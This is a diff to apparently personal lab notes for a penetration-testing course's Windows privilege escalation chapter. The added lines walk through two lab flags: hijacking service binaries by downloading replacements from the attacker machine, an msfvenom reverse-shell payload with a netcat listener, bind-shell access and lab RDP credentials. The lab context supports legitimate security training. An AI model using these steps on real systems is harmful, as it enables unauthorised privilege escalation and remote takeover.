@@ -1,4 +1,4 @@
-# Comands to execute  to get flags for labs
+# Commands to execute  to get flags for labs
 
 ### Chapter 16 - Windows Privilege Escalation
 
@@ -86,8 +86,24 @@ Q2) Download a precompiled version of Seatbelt or compile it yourself. To find a
     
 **==== 16.2.1 ====**  
 
-Q1) Connect to the bind shell (port 4444) on CLIENTWK220 (VM #1) and follow the steps from this section. Find the flag on the desktop of backupadmin.
+Q1) Follow the steps outlined in this section on CLIENTWK220 (VM #1) to replace the service binary of the service mysql. Enter the flag, which can be found on the desktop of user daveadmin.
   - Use VM #1
+  - use nc `nc 192.168.190.220 4444`
+  - on kali, compile the addUser.c with `x86_64-w64-mingw32-gcc Add.c -o adduser.exe` and start a web server
+  - on target run `move C:\xampp\mysql\bin\mysqld.exe mysqld.exe`=
+  - pull down the binary `wget http://192.168.45.224/adduser.exe -o C:\xampp\mysql\bin\mysqld.exe`
+  - restart computer `restart-computer`
+  - login to rdp with new user `xfreerdp /u:dave2 /p:password123! /v:192.168.190.220 /h:600` and read flag on `daveadmin` desktop
+
+Q2) Connect to CLIENTWK221 (VM #2) via RDP as user milena with the password MyBirthDayIsInJuly1!. Find a service in which milena can replace the service binary. Get an interactive shell as user running the service and find the flag on the desktop.
+  - use VM #2
+  - conect with xfreerdp `xfreerdp /u:milena /p:MyBirthDayIsInJuly1! /v:192.168.190.221 /h:600`
+  - on kali, create msfvenom payload `msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.224 LPORT=4444 -f exe -o  BackupMonitor.exe` and host on web server
+  - on target remove this exe from dir `move C:\BackupMonitor\BackupMonitor.exe .\mysqld.exe`
+  - cd to the directory download the file `wget http://192.168.45.224/BackupMonitor.exe -o C:\BackupMonitor\BackupMonitor.exe`
+  - set up listener on kali `nc -nlvp 4444`
+  - restart computer and listen to kali `restart-computer`
+  - flag is  `type C:\Users\roy\desktop\flag.txt`
 
 **==== 16.2.2 ====**  
 
